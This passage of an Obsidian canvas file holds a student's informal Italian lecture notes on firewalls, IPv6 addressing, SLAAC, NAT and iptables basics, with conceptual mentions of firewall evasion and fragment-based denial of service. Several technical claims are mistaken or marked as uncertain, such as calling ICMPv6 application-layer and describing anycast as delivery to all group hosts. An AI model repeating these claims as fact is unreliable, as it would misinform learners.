fa un esempio di regole che sembrano buone ma non lo sono. pensa sempre a come attaccare le regole dall'esterno (e guarda la rec).\n\n(vabbè ma qui il punto è: faccio regole perfette e permetto solo una connessione (e.g smtp) legittima, nel senso sulle giuste porte. Chi vieta all'attaccante di mettere nel payload della roba brutta in delle richieste legittime? tipo fare injection o simili? vabb questa è na cosa mia, non l'ha detto, ma forse si risolve con IDS e simili)\n\npoi fa problemi di frammentazione IP e SYN flooding tipo e introduce i firewall stateful. in pratica connection tracking networks servono a verificare che i singoli pacchetti abbiano senso all'interno di una connessione. \n\nriguardati bene il funzionamento di TCP.\n\nquesto vale per i protocolli stateful. e per quelli stateless, tipo ping request, ICMP, HTTP? Il firewall stesso crea la nozione di connessione anche tipo su UDP. Cioè, anche se la connessione in sé non esiste, il firewall tiene traccia del flusso per un certo periodo di tempo per controllare cosa succede. Non è troppo difficile, vedrai un match tra source/destination che si invertono nel pacchetto nel verso opposto (richiesta/risposta). Posso in questo modo accettare roba dall'esterno solo se la connessione viene originata da un computer interno alla rete.\n\n`iptables` può implementare stateful firewall.\n\ninfine abbiamo il livello proxy, cioè scendo fino all'applicazione. Qui andiamo su roba super application-specific. è difficile parlare di firewall in questo caso, perché ogni applicazione ha il suo. piuttosto a questo livello arriva l'IDS per capire cosa c'è nel pacchetto.\n\nè molto utile per protezione da varie ed eventuali, tipo injection e simili. è limitato però da TLS ed encryption in generale, quindi non è ovvio capire cosa c'è nei pacchetti.\n\nSOCKS? riascolta sta parte (tcp relay, simile al tor routing)\n\nsaltato una slide perché mi sono distratto 12 secondi\n\nNG-Firewalls introduce un botto di roba","x":-8061,"y":11438,"width":759,"height":1982},
		{"id":"399d0f8bfe3f80d5","type":"text","text":"# IPv6 - 07/03\n\nad oggi abbiamo finito gli IPv4, e ne allochiamo di nuovi solo se qualcuno li restituisce a IANA. \n\nIoT con IPv6?\n\nIPv6 ha $\\sim 3.4\\cdot 10^{38}$ (o alla 36?) indirizzi. In teoria risolve la necessità di usare il NAT. Ogni hex sono 4 bit. 128 bit sono 32 esadecimali in 8 gruppi da 4. parte di rete e parte di host sono simmetriche (16 e 16 hex - sì, ma per essere precisi i primi 3 gruppi sono network, il quarto per la sottorete e gli altri gli host). huge amount of hosts, questo protegge gli host perché enumeration diventa difficilissimo (ci metti ordine secoli).\n\n:: comprime intere stringhe di 0. Non ogni singolo blocco da 4 hex!: cioè non si trova `AB::::CD:1200::10`, si comprime solo la più lunga (e se ce ne sono due uguali si comprime solo la prima). Quindi posso avere `2001:DB8:1000::1` (meaning `2001:DB8:1000:0:0:0:0:1`, typical exam question)\n\nslide 25 (ignora anycast) - no broadcast, diventa multicast\n\n- global unicast = identico a ipv4\n- link local sono usati solo in un link interno alla rete. ogni coppia che comunica in locale ha una coppia di ipv6.\n- unique local = indirizzi privati di ipv4\n- embedded ipv4 - retrocompatibilità\n\n\n","x":-7431,"y":4437,"width":759,"height":625},
		{"id":"acbfb7d40b4eec22","type":"text","text":"# Sicurezza\n\nhuge amount of hosts, questo protegge gli host perché enumeration diventa difficilissimo (ci metti ordine secoli).\n\nci sono talmente tanti indirizzi che potresti usarne uno diverso per ogni richiesta (che senso ha???? potrebbe averlo detto solo come esempio)","x":-11588,"y":12287,"width":759,"height":613},
		{"id":"3dc6c55ed2b09b97","type":"text","text":"\nlink-local è solo entro rete/sottorete (tipo il MAC, infatti sei costretto ad averne almeno uno). Non attraversano il router. Pertanto, devono essere unici entro la rete (...come gli indirizzi privati. ma allora cosa cambia con unique local???). range da `FE80` a `FEBF`.\n\nPer questo qualsiasi interfaccia IPv6 ha sempre un indirizzo associato che inizia con `fe80` o simili entro range. `fe80` è self assigned, altrimenti gli altri sono per applicazioni specifiche. Tipicamente dopo `fe80` gli altri N sono tutti 0. Ma come genero una roba unica?\n\n- EUI-64 genera un IPv6 basandosi sulla NIC (tipo sul suo MAC, che in teoria è unico. OUI sono vendor-specifici e Device... sono per il device). Aggiunge `FFFE` in mezzo al mac, se lo vedo so che è EUI-64. poi flippa il 7mo bit (\"don't ask why\");\n- random (su 64 bit è improbabile fare la stessa scelta... speriamo!). Molti SO fanno così\n\naltrimenti manuale (common practice for routers).\n\nquesto link-local è cruciale per assegnare un global unicast address con il protocollo SLAAC (self assignment within the network): quando mi connetto, il router mi manda al link local un messaggio tipo `ciao, sono il gateway, auto-assegnati un ipv6 globale pls`. In pratica questo sostituisce DHCP.\n\n- riassumendo: mi connetto e mi auto-assegno un ip link-local ipotizzando sia unico (probabile). il router mi vede e si presenta, dicendomi che voglio comunicare con l'esterno devo passare da lui, ma in caso mi devo  assegnare un indirizzo globale.","x":-12380,"y":10268,"width":748,"height":745},
		{"id":"446577bee9616f15","type":"text","text":"# IPv6 II - 14/03\n\nmulticast\n- assigned - per protocolli x (qualsiasi indirizzo che inizia per `FF`)\n- solicited - ICMPv6 sostituisce ARP (che usa broadcast) con neighbour discovery. 24 bit per gli hosts\n\nunicast\n- global unicast - `2000::/3` significa che i primi 4 bit sono `0010`. Questo significa che gli indirizzi di global unicast iniziano con i ***bit*** `001`, quindi il primo quartetto di ***bit*** è `2 (0010)` o `3 (0011)`. Quindi il primo quartetto di ***hex*** va da `2000` a `3FFF`.\n\t- il global unicast rappresenta 1/8 del totale degli indirizzi! un'altra fetta di torta è divisa tra tutti gli altri \"protocolli\", il resto è inutilizzato;\n\t- Dico un ottavo perché con `/3` bit conti fino ad 8. Con la stessa logica un gruppo `/10` è un $2^{10}$-esimo del totale.\n\t- fanno sostanzialmente le veci degli indirizzi pubblici in IPv4\n- unique local - `FC00::/7` - corrispondono agli indirizzi privati in IPv4 (192.168.x.x, ...).\n\nil source IPv6 è sempre unicast, la destinazione qualsiasi (obv).\n\n`2001:DB8::/32` sono usati per giocare, mai su internet\n\nglobal routing prefix (la parte di rete), subnet ID, interface (host) - rule 3 1 4: incrementa di 1 il quarto quartetto di hex e cambierai sottorete entro la stessa rete\n\ne comunque è diviso a metà tra rete e host\n\nci sono talmente tanti indirizzi che potresti usarne uno diverso per ogni richiesta (che senso ha???? potrebbe averlo detto solo come esempio)\n\n\n\n##### link-local\n\nlink-local è solo entro rete/sottorete (tipo il MAC, infatti sei costretto ad averne almeno uno). Non attraversano il router. Pertanto, devono essere unici entro la rete (...come gli indirizzi privati. ma allora cosa cambia con unique local???). range da `FE80` a `FEBF`.\n\nPer questo qualsiasi interfaccia IPv6 ha sempre un indirizzo associato che inizia con `fe80` o simili entro range. `fe80` è self assigned, altrimenti gli altri sono per applicazioni specifiche. Tipicamente dopo `fe80` gli altri N sono tutti 0. Ma come genero una roba unica?\n\n- EUI-64 genera un IPv6 basandosi sulla NIC (tipo sul suo MAC, che in teoria è unico. OUI sono vendor-specifici e Device... sono per il device). Aggiunge `FFFE` in mezzo al mac, se lo vedo so che è EUI-64. poi flippa il 7mo bit (\"don't ask why\");\n- random (su 64 bit è improbabile fare la stessa scelta... speriamo!). Molti SO fanno così\n\naltrimenti manuale (common practice for routers).\n\nquesto link-local è cruciale per assegnare un global unicast address con il protocollo SLAAC (self assignment within the network): quando mi connetto, il router mi manda al link local un messaggio tipo `ciao, sono il gateway, auto-assegnati un ipv6 globale pls`. In pratica questo sostituisce DHCP.\n\n- riassumendo: mi connetto e mi auto-assegno un ip link-local ipotizzando sia unico (probabile). il router mi vede e si presenta, dicendomi che voglio comunicare con l'esterno devo passare da lui, ma in caso mi devo  assegnare un indirizzo globale.","x":-6374,"y":3895,"width":759,"height":1353},
		{"id":"8599a82797877dbd","type":"text","text":"# assign global unicast\n\n- manuale - chiaro\n- dynamic - su IPv4 si fa con DHCP. Qua si può fare in due modi:\n\t- stateful i.e. conosco la distribuzione degli indirizzi (DHCPv6). Quindi c'è un server che sa.\n\t\t- c'è prefix delegation per farsi assegnare un'intera rete invece di un unico coso globale\n\t- stateless, i.e. non li conosco e non mi interessano (SLAAC)\n\t- esiste metodo ibrido SLAAC + DHCPv6, dice che si usa con DNS locale per cose entro la rete (?)\n\n\n1. SLAAC (vedi SLAAC, slide 63 i rossi sono uguali perché generati allo stesso modo)\n\t1. e che succede se scegliamo lo stesso IPv6? duplicate address detection: se nessuno risponde alla mia neighbor solicitation con l'IP che voglio scegliere, allora lo scelgo\n2. router as DHCP server - identico ma cambiano delle flag (vedi rec, sta correndo un po') - you take the ip you want but look for DNS (?)\n3. solo DHCP (come IPv4).","x":-13634,"y":9981,"width":580,"height":575},
		{"id":"f8f784a5228df460","type":"text","text":"# Prefix Delegation\n\nstessa cosa di prima, ma chiedo N indirizzi. fatto in genere dai router che sanno di avere degli hosts dietro (anche io posso essere il router della mia casa domotica, per esempio). Faccio prefix delegation request.\n\nRA = Router Advertisement\n\nva le veci di IANA tipo","x":-13634,"y":10641,"width":580,"height":420},
		{"id":"08311dacd8c22b8d","type":"text","text":"# SLAAC","x":-12048,"y":11713,"width":250,"height":60},
		{"id":"3a18d8b86987743d","type":"text","text":"# SLAAC (find link local)\n\nFunziona su ICMPv6 (application layer) al posto di ARP (IP addresses over ethernet, na roba strana). è un neighbor discovery.\n\n- router\n\t- solicitation - quello che ho scritto prima, quando mi connetto dico un `hey (to all routers): chi è il router?` (tramite un indirizzo multicast, `FF02::1`, `all ipv6 devices in the local link`, l'info è in quell'`1` finale) CREDO\n\t- advertisement (RA) - il router risponde `io, entro questo prefisso di rete scegli l'host che vuoi, diventerà il tuo global unicast`\n- neighbor - solicitation e advertisiment è identico ad ARP. in pratica ho il global unicast ma vedo che è nella mia rete. quindi mi serve il link local. è identico ad ARP, link local è il mac e il global è l'ip4;\n\t- quindi che cambia? neighbor solicitation fa multicast (che in pratica è broadcast sulla rete locale???)\n- redirect\n\nin ogni caso l'advertising router diventa il default gateway\n\n\n\nsolicited: \"IP, dimmi il tuo MAC\". con la scusa la gente che riceve fa l'associazione IP-MAC di chi manda.\nunsolicited: pubblicizzo gratuitamente la mia coppia IP-MAC senza chiedere nulla","x":-13314,"y":11438,"width":759,"height":683},
		{"id":"11eb84fe247e180f","type":"text","text":"# 21.3 - Multicast\n\nogni multicast parte con 8 uni (FF). \n\nflag - si usa quasi solo lo 0 (permanent assigned by IANA)\n\nall devices: router advertisement\n- ma quindi è un broadcast? ... non proprio, perché non è su IPv6 ma sul MAC (?)\nall routers: discovery\necc\n\nserver DHCP può essere non nella stessa rete. il router fa da tramite.\n\nIPv6 toglie checksum perché c'è già a livello 2 (ethernet) e livello 4 (TCP, UDP)\n\n(Encryption a livello 2 è ottima, perché non si vede manco la destinazione di IP)-> non so cosa c'entra, mi sa che sta parlando di eduroam con quelli a distanza\n\nIPv4 ha header di dimensione variabile a causa delle options. Con IPv6 è sempre 40 bytes.\n- evito di distinguere header size (IHL, espresso in numero di word da 32bit, in genere 5 se non ci sono opzioni) e payload size (total len)\n\t- questo perché 99% dei pacchetti non usava opzioni. se serve, complichiamo, dice ipv6.\n- inizio subito a leggere\n\nnota che anche in v6 ci sono le options. \n\ntraffic class è il tipo di servizio da offrire (e.g. real time, ecc)\n\nflow label è una novità. non lo usa quasi nessuno. si può usare per raggruppare diversi pacchetti. IPv4 è stateless, questo può rendere IPv6 un po' stateful (i.e. se diversi pacchetti fanno parte dello stesso flow). diverse connessioni TCP dovrebbero avere diversi flow label. \n\nnext header è il modo di interpretare i prossimi 40bytes. di norma è (zero?) se ci sono dati, altrimenti c'è un extension header (per le opzioni?). Si possono fare in catena (chain of...). questa roba si legge solo end-to-end (a parte specifiche routing e hop-to-hop). in pratica solo gli edge processano le options, tutti gli altri router intermedi leggono una roba fissa e forwardano velocissimi.\n\n- routing permette di speciicare il path per la destinazione\n- ESP (encryption, usato per le VPN), AH (authentication, nessuno può modificare senza che il destinatario lo sappia, hash firmato con (la chiave del sender NO! PEERCHé NO???) con un message authentication code) serve per IPSec (implementarlo qui te lo applica su tutti i layer superiori).\n\t- spe forse MAC è hash crittato con chiave simmetrica\n- l'ordine delle options è importante (vedi slides). perché due volte destination? la seconda è crittata.","x":-14390,"y":11500,"width":790,"height":1400},
		{"id":"24f129c1304ba762","type":"text","text":"# 28.3\n\ncovert channel!\n\nscambiando l'ordine degli extension header puoi fregare il firewall (a quanto pare dovrebbero essere droppati ma in pratica nessuno lo fa)\n\nproblema con gli overlapping fragments (perché succede?? di base ti consigliano di buttare tutto se vedi overlap ma pare nessuno lo faccia) - weakness of complexity (indaga) (poi ne parla di nuovo più avanti) (rec!! bello che puoi bloccare tutto waiting for last fragment. simile a SYN attack o request http senza completare richiesta, mirano tutti a DoS)\n\ndovresti anche buttare i frammenti non frammenti (risultano esserlo, ma ce n'è solo uno)\n\nsoluzione al ping pong di router specification: deprecated (reject it!)\n\nswitch si aspetta advertisement del router solo su una certa porta. non ho capito bene, un attacker può fare roba brutta usando la stack di header (rec). in pratica devi analizzare tutti gli header per essere sicuro.\n\nignora IPsec\n\nfd00 è UniqueLocalAddress\n\n`traceroute` è per determinare il network prefix??\n\nOUI: vendor, FFFE fixed, quindi poca roba da guessare\n\nsalta slide prima di security tips.\n\n#### 3.1 andiamo in application layer (?)\n\nICMPv6 per i giochi con advertisement/solicitation (potentissimi mi sa, specie bogus)\n\ntutto questo si filtra con gli switch (l'idea è che conosce su che porta sta il router, e se arriva una RA da un'altra quello CAAAPISCE che non dovrebbe e la blocca, e simili)","x":-12838,"y":12429,"width":790,"height":843},
		{"id":"9338dce122e9b7bf","type":"text","text":"# Indirizzi IPv6 (Reti)\n\nNon ci sono più IPv4 disponibili? La soluzione non è il NAT, ma creare un nuovo formato di indirizzi a $128\\,bit$. Questo permette di identificare *ogni oggetto* su internet (e.g. una pagina web). O almeno, questa è la teoria. In pratica IPv6 è lontano dall'adozione globale.\n\nPerò è molto bello, si focalizza sull'essere snello e veloce.\n\n- L'header ha lunghezza fissa, so già dov'è il payload e posso leggerlo in parallelo;\n- Niente checksum (ci pensano i protocolli superiori)\n- Niente frammentazione (se un pacchetto supera l'MTU viene scartato!). Questo richiede di esplorare il percorso con un algoritmo di ***Path MTU Discovery*** (***PMTUD***) che sfrutta ICMP;\n- Prevede un parametro `flow label` per sviluppi futuri (il controllo di flusso secondo etichetta da parte dei router non è ancora implementato su Internet);\n- Implementa bene l'***anycast***, ovvero la consegna a tutti gli host facenti parte di un gruppo;\n- La lunghezza complessiva del datagramma è molto minore rispetto ad IPv4.\n\nil problema è che quasi tutti i router sono ancora IPv4. Per trasmettere un IPv6 devo spesso Incapsularlo come payload dell'IPv4 (***tunneling***).\n\nAttualmente non funziona bene, ma in futuro si può cambiare il concetto di cosa rappresenta un indirizzo: può diventare direttamente un URI di ogni oggetto che metto online (piuttosto che una destinazione!). Ovvero, è un hash che identifica l'oggetto.\n\n\"IPFS (Interplanetary Filesystem), molto carino per applicazioni p2p.\"","x":-11760,"y":13272,"width":759,"height":691,"color":"4"},
		{"id":"2ef2012b457473ef","type":"text","text":"# `iptables` - HowToFirewall (& HowToRouter?)\n\nOgni pacchetto che transita nel sistema Linux  viene valutato secondo un set di regole che definiscono se e come inoltrarlo. Tali regole sono definite in `iptables`.\n\nLe regole sono organizzate in ***chain***, liste ordinate che permettono di valutarle in sequenza (i.e. la prima regola verrà valutata per prima). \n\n- `-t [table]` - Specifica il tipo di regole da visualizzare o modificare:\n\t- `filter` - Regole che definiscono quali pacchetti accettare, inoltrare o bloccare. Le chain principali di questa tabella sono `INPUT` (regolamenta il traffico in ingresso), `OUTPUT` (in uscita) e `FORWARD` (se decidiamo di comportarci da router);\n\t- `nat` - Regole di `NAPT`;\n\t- `mangle` - Regole di modifica dei pacchetti (e.g. cambiare il `TTL`).\n- `-L` - Mostra le regole. Di norma si usa insieme ad opzioni per migliorare la leggibilità, tipo `-v` (`verbose`), `-n` (evita di risolvere i nomi con `DNS`) e `--line-numbers` (utile se mi serve capire quale regola cancellare);\n- `-A`, `-I` - Aggiungono una regola, rispettivamente, alla fine e all'inizio della chain su cui vengono chiamate (e.g. `iptables -A INPUT -s 192.168.1.100 -j DROP`  aggiunge in coda la regola `droppa tutto ciò che arriva da 192.168.1.100`);\n\t- `-j` - Definisce la regola in sé (e.g. `DROP`, `ACCEPT`, ...).\n- `-D` - Rimuove una regola (e.g. `iptables -D INPUT 1` rimuove la prima regola di `INPUT`);\n\t- `-F` (`flush`) - Cancella tutte le regole.\n- `-R` - Modifica una regola esistente;\n- `-N` - Crea una nuova chain <span style=\"color:rgb(236, 155, 14)\">magari poi ci torniamo</span>;\n- `-P` - Imposta una policy complessiva (e.g. `iptables -P INPUT DROP` blocca tutto il traffico in ingresso, <span style=\"color:rgb(236, 155, 14)\">eventualmente sta ad una regola nella chain permettere a qualcosa di specifico di entrare con una direttiva `ACCEPT`</span>).\n\n`iptables` di per sé ***non salva le regole al reboot***. Se voglio preservarle devo salvarle (con `iptables-save > /etc/iptables.rules`) e poi ripristinarle al riavvio (`iptables-restore < /etc/iptables.rules`).\n\n`-j MASQUERADE` per il routing??","x":-7052,"y":11438,"width":759,"height":867,"color":"3"},
		{"id":"7bf1e73f4cdb5397","x":-7200,"y":12706,"width":907,"height":1254,"type":"text","text":"# NAT ([RFC 1918](https://www.rfc-editor.org/rfc/rfc1918.html), 1996)\n\nserve anche ad implementare roba tipo `IPv6` over `IPv4`, private to private (IP) nel senso non solo privato mascherato con un pubblico + porta\n\nnon è proprio vero che gli IPv4 pubblici sono unici. Pensa a DNS. L'IP di un root nameserver nasconde dietro N servers. dipende da chi pubblicizza quell'indirizzo pubblico.\n\nUna buona risposta al DDOS è ad esempio che qunado mi rendo conto di essere bersagliato faccio pubblicizzare lo stesso IP a diversi ISP in modo da distribuire il traffico (anycast). Questa roba la fa Cloudfare.\n\nshared address space `100.64/10` (quindi da 100.64.x.x a 100.127.x.x) implementa internal routing. eg. Fastweb usa sta roba per il routing interno all'Italia.\n\n\"NAT is an intrinsic firewall\"\n\nproblemi del NAPT:\n\n- se cambio la porta devo cambiare il checksum di TCP/UDP;\n- encryption - se critto il payload di IP è un casino per il NAPT. IPSec è un problema! il firewall rompe l'integrità del pacchetto (oltre al fatto che può rompere la confidenzialità, essendo di fatto un MitM?)\n- gestione delle incoming requests. il NAPT di default blocca tutte le connessioni in ingresso (slide 14)\n\nDMZ espone un host privato direttamente ad Internet, i.e. mando a lui tutte le requests esterne che non sono originate dall'interno. non una grande idea in generale.\n\n(salto di disattenzione)\n\nvedremo alcuni protocolli ma non kerberos\n\npoi arriva fino a slide 30 tipo ma ormai ho perso l'attenzione\n\n\n"}
	],
	"edges":[
		{"id":"428ec3c727bcfebf","fromNode":"22dfa299c258426a","fromSide":"top","toNode":"8603be4ae948e472","toSide":"bottom"},
		{"id":"0f8ae08f684e1ba4","fromNode":"22dfa299c258426a","fromSide":"left","toNode":"4282f1f0f685c1b7","toSide":"right"},
		{"id":"3b8450f5d7d06324","fromNode":"22dfa299c258426a","fromSide":"top","toNode":"eab759960ddcf808","toSide":"bottom"},
		{"id":"b97dacf49ed55fcb","fromNode":"0f2a36c9dcf84a3e","fromSide":"right","toNode":"7b351e91b16f865e","toSide":"left"},
		{"id":"1eec059325077352","fromNode":"7b351e91b16f865e","fromSide":"top","toNode":"22dfa299c258426a","toSide":"bottom","label":"How to get there?"},
		{"id":"cdbb7c68033e5b65","fromNode":"7b351e91b16f865e","fromSide":"bottom","toNode":"1cdecb81c364493b","toSide":"top","label":"Where am I?"},
		{"id":"c13c78293edc7b6d","fromNode":"7b351e91b16f865e","fromSide":"right","toNode":"ea0a31adef225299","toSide":"left"},
		{"id":"bda9d6a558058968","fromNode":"ea0a31adef225299","fromSide":"top","toNode":"d8bd274b8f96df69","toSide":"bottom"},
		{"id":"3d3d010e414423c8","fromNode":"ea0a31adef225299","fromSide":"bottom","toNode":"04825a06a9d94d59","toSide":"top"},
		{"id":"6ba4b4daaae0441c","fromNode":"ea0a31adef225299","fromSide":"right","toNode":"625ede0e186681f5","toSide":"left"},
		{"id":"5359adb1693d9726","fromNode":"d8bd274b8f96df69","fromSide":"right","toNode":"4e494b0e134ff4a7","toSide":"left"},
		{"id":"f9071934d54f1998","fromNode":"625ede0e186681f5","fromSide":"top","toNode":"4e494b0e134ff4a7","toSide":"bottom"},
		{"id":"e5c67dbcd146b146","fromNode":"04825a06a9d94d59","fromSide":"bottom","toNode":"3d73dc291ec51cb6","toSide":"top"},
		{"id":"38de5c3f0b17d32d","fromNode":"3d73dc291ec51cb6","fromSide":"right","toNode":"efbeb23d6fccc658","toSide":"left"},
		{"id":"66a677d308a98e43","fromNode":"04825a06a9d94d59","fromSide":"right","toNode":"efbeb23d6fccc658","toSide":"left"},
		{"id":"c00a9d792bd09d56","fromNode":"efbeb23d6fccc658","fromSide":"bottom","toNode":"592cc115c760d58b","toSide":"top"},
		{"id":"4c7f78114b7c8129","fromNode":"ea0a31adef225299","fromSide":"top","toNode":"4e494b0e134ff4a7","toSide":"bottom"},
		{"id":"e3085dcdb384f960","fromNode":"4e494b0e134ff4a7","fromSide":"top","toNode":"b008c9c94e60d49d","toSide":"bottom"},
		{"id":"5de8114eb7808ca7","fromNode":"4e494b0e134ff4a7","fromSide":"top","toNode":"b3872fe16b478ecb","toSide":"bottom"},
		{"id":"620010ae0292ff42","fromNode":"b3872fe16b478ecb","fromSide":"top","toNode":"db8524057030a7aa","toSide":"bottom"},
		{"id":"30a1708adf9120a5","fromNode":"db8524057030a7aa","fromSide":"left","toNode":"1e4bdb54f9ff41bb","toSide":"right"},
		{"id":"7bbfe86e354e11ed","fromNode":"db8524057030a7aa","fromSide":"right","toNode":"9d6e1bc42fdc8fff","toSide":"left"},
		{"id":"b68568742b046ca0","fromNode":"9353a581758bae87","fromSide":"top","toNode":"9d6e1bc42fdc8fff","toSide":"bottom"},
		{"id":"14a1a2a060a23607","fromNode":"db8524057030a7aa","fromSide":"right","toNode":"9353a581758bae87","toSide":"left"},
		{"id":"3b09bf2c29cee2c5","fromNode":"db8524057030a7aa","fromSide":"top","toNode":"725abded725d4498","toSide":"bottom"},
		{"id":"ab9bccd43d4b692d","fromNode":"b008c9c94e60d49d","fromSide":"right","toNode":"2d903151dad0b196","toSide":"left"},
		{"id":"f20c7728e211c431","fromNode":"4e494b0e134ff4a7","fromSide":"right","toNode":"2e2f2fffcb29a514","toSide":"left"},
		{"id":"30acbdd63f807416","fromNode":"4e494b0e134ff4a7","fromSide":"bottom","toNode":"7be47aaf1eeeeb0d","toSide":"top"},
		{"id":"9b1ddf1a628d2da5","fromNode":"625ede0e186681f5","fromSide":"right","toNode":"19241c3faaf980ec","toSide":"left"},
		{"id":"16c1578973d5ed8d","fromNode":"625ede0e186681f5","fromSide":"top","toNode":"2e2f2fffcb29a514","toSide":"bottom"},
		{"id":"a11cccead9f2dfe0","fromNode":"19241c3faaf980ec","fromSide":"bottom","toNode":"d6df1ebc088bc55b","toSide":"top"},
		{"id":"3f43813ae6dda381","fromNode":"19241c3faaf980ec","fromSide":"bottom","toNode":"fde5e59d70e6ddbe","toSide":"top"},
		{"id":"97e49f4ab1d118a3","fromNode":"19241c3faaf980ec","fromSide":"bottom","toNode":"28c7fa5a4a2add1f","toSide":"top"},
		{"id":"3e74ea0b969c67d7","fromNode":"28c7fa5a4a2add1f","fromSide":"bottom","toNode":"09449e1e2bf4e019","toSide":"top"},
		{"id":"f0318b1cdc3881bc","fromNode":"19241c3faaf980ec","fromSide":"right","toNode":"22b8634d71376455","toSide":"left"},
		{"id":"00741801b9d873d6","fromNode":"2e2f2fffcb29a514","fromSide":"right","toNode":"df5e2abc8ea4b780","toSide":"left"},
		{"id":"66c11ba53c554d96","fromNode":"22b8634d71376455","fromSide":"top","toNode":"3565595bf897b446","toSide":"bottom"},
		{"id":"05456b6d30048acb","fromNode":"22b8634d71376455","fromSide":"top","toNode":"603628298b4df9a2","toSide":"bottom"},
		{"id":"7dd25d49892a4964","fromNode":"d6df1ebc088bc55b","fromSide":"right","toNode":"0e6f99d9025a7954","toSide":"left"},
		{"id":"d82539944e94e697","fromNode":"22b8634d71376455","fromSide":"top","toNode":"c77fc76ca3f24940","toSide":"bottom"},
		{"id":"56fd97094b3cb634","fromNode":"603628298b4df9a2","fromSide":"top","toNode":"5cce19db2eacb68d","toSide":"bottom"},
		{"id":"9591b59f3b3be6dc","fromNode":"603628298b4df9a2","fromSide":"top","toNode":"ea6a4509f0ba551c","toSide":"bottom"},
		{"id":"448ea8b3e69ae08a","fromNode":"22b8634d71376455","fromSide":"bottom","toNode":"0e6f99d9025a7954","toSide":"top"},
		{"id":"d5b173cc1ea1a05f","fromNode":"6033fbd5014b0cba","fromSide":"bottom","toNode":"e5fc1848775e11e1","toSide":"top"},
		{"id":"5cda0cd9571b9d0a","fromNode":"0f2a36c9dcf84a3e","fromSide":"left","toNode":"e660a0288c5cee37","toSide":"right"},
		{"id":"6d86ee83c255b737","fromNode":"e218e0589f82e95a","fromSide":"top","toNode":"0f2a36c9dcf84a3e","toSide":"bottom"},
		{"id":"87735d418c09fb25","fromNode":"e660a0288c5cee37","fromSide":"left","toNode":"c61155df72f8f47a","toSide":"right"},
		{"id":"386d6a68c92c107b","fromNode":"e660a0288c5cee37","fromSide":"bottom","toNode":"f4f2a29153e51075","toSide":"top"},
		{"id":"59c22fe6415ef2b2","fromNode":"0f2a36c9dcf84a3e","fromSide":"left","toNode":"f4f2a29153e51075","toSide":"right"},
		{"id":"6da1470c749a896e","fromNode":"c61155df72f8f47a","fromSide":"bottom","toNode":"430d8b04ba92b85a","toSide":"top"},
		{"id":"519ba9f70daa64c7","fromNode":"d8bd274b8f96df69","fromSide":"top","toNode":"26065c6695f63b89","toSide":"bottom"},
		{"id":"33a4a2d848107c08","fromNode":"26065c6695f63b89","fromSide":"right","toNode":"b3872fe16b478ecb","toSide":"left"},
		{"id":"91e29291668527bf","fromNode":"26065c6695f63b89","fromSide":"left","toNode":"52300a2aca6a3d2b","toSide":"right"},
		{"id":"7ae20d6cc93f45b0","fromNode":"8599a82797877dbd","fromSide":"bottom","toNode":"f8f784a5228df460","toSide":"top"},
		{"id":"98012f482a86c47c","fromNode":"26065c6695f63b89","fromSide":"left","toNode":"049e5ead3118c000","toSide":"right"},
		{"id":"187e71ec766b8131","fromNode":"4f8240ee05d14bd3","fromSide":"right","toNode":"ef01ecee9344c97a","toSide":"left"},
		{"id":"d6b4994faf243a57","fromNode":"4f8240ee05d14bd3","fromSide":"right","toNode":"62d77e93a738633d","toSide":"left"},
		{"id":"091bc551d731a0de","fromNode":"72d78acc98f57a75","fromSide":"right","toNode":"57a7f3f226adc78b","toSide":"left"},
		{"id":"879ef12524891c88","fromNode":"72d78acc98f57a75","fromSide":"right","toNode":"d76be3d4d10ad0c4","toSide":"left"},
		{"id":"12ef2def5944f62a","fromNode":"72d78acc98f57a75","fromSide":"left","toNode":"3ce011a34d648316","toSide":"right"},
		{"id":"0261c436dd6e5452","fromNode":"1f7d268a16eedc89","fromSide":"bottom","toNode":"9ef9565d73660350","toSide":"top"},
		{"id":"068c1dad3a05ba5c","fromNode":"72d78acc98f57a75","fromSide":"top","toNode":"99ef27d883dac209","toSide":"bottom"},
		{"id":"821a8b0858ea3b78","fromNode":"72d78acc98f57a75","fromSide":"left","toNode":"52fa94b909771d9b","toSide":"right"},
		{"id":"61fb6af28608a35a","fromNode":"fc31d285a8ba2ad3","fromSide":"top","toNode":"72d78acc98f57a75","toSide":"bottom"},
		{"id":"b45f06e4633b61fa","fromNode":"fc31d285a8ba2ad3","fromSide":"left","toNode":"1f7d268a16eedc89","toSide":"right"},
		{"id":"7d3163884c6ad53d","fromNode":"a35f9569f0925a3a","fromSide":"top","toNode":"fc31d285a8ba2ad3","toSide":"bottom"},
		{"id":"8f7ccb835002cf3c","fromNode":"bbd22089bc42007f","fromSide":"right","toNode":"9290043c9f3df071","toSide":"left"},
		{"id":"9f79a9baa75f162a","fromNode":"bbd22089bc42007f","fromSide":"right","toNode":"9b371b4161e579d9","toSide":"left"},
		{"id":"0c18907de10d5823","fromNode":"48960e7373f05723","fromSide":"right","toNode":"bbd22089bc42007f","toSide":"left"},
		{"id":"7a1fdb8856fe5b8b","fromNode":"7a683155fe19cadc","fromSide":"right","toNode":"a0722c7f81126360","toSide":"left"},
		{"id":"3d5a6c890f9a4714","fromNode":"7a683155fe19cadc","fromSide":"top","toNode":"5e078390c80df780","toSide":"bottom"},
		{"id":"17f9ad3245550f33","fromNode":"8d45a43704e34f6f","fromSide":"right","toNode":"7a683155fe19cadc","toSide":"left"},
		{"id":"f6fbeb91e1525096","fromNode":"8d45a43704e34f6f","fromSide":"top","toNode":"39fe9d808700246c","toSide":"bottom"},
		{"id":"ca048ccd260824d6","fromNode":"9314d10e8c398b40","fromSide":"right","toNode":"8d45a43704e34f6f","toSide":"left"},
		{"id":"cacd4da7dc337b83","fromNode":"48960e7373f05723","fromSide":"bottom","toNode":"5b890feef7056429","toSide":"top"},
		{"id":"84ef2bddc4835adc","fromNode":"9314d10e8c398b40","fromSide":"right","toNode":"48960e7373f05723","toSide":"left"},
		{"id":"41ea127f7f322570","fromNode":"9314d10e8c398b40","fromSide":"top","toNode":"39fe9d808700246c","toSide":"left"},
		{"id":"9497ab9c7fb19e6c","fromNode":"99ef27d883dac209","fromSide":"right","toNode":"9314d10e8c398b40","toSide":"left"},
		{"id":"445d82cc51950a8b","fromNode":"99ef27d883dac209","fromSide":"top","toNode":"08f3eea3d4feef51","toSide":"bottom"},
		{"id":"3ba07eb4a5e2f443","fromNode":"52fa94b909771d9b","fromSide":"top","toNode":"99ef27d883dac209","toSide":"left"},
		{"id":"2cb65c16a553f923","fromNode":"39fe9d808700246c","fromSide":"right","toNode":"5e078390c80df780","toSide":"left"},
		{"id":"58514f9200ca0636","fromNode":"53ab523aeef9ec9a","fromSide":"top","toNode":"a35f9569f0925a3a","toSide":"bottom"},
